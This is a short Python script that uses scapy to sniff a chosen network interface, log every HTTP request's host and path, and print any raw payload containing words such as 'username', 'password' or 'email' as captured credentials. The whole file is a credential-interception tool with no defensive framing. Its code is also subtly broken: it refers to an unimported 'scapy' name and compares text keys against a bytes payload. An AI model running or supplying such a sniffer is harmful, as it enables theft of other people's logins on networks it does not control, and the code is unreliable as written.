from scapy.layers.http import HTTPRequest
from scapy.layers import http
from scapy.all import *
import argparse

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.all.sniff(iface=iface, store=False, prn=process_packets)

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username","password","pass","email"]
            for key in keys:
                if key in load:
                    print("[+] Possible pasword/username >>" + load)
                    break

iface = get_interface()
sniff(iface)
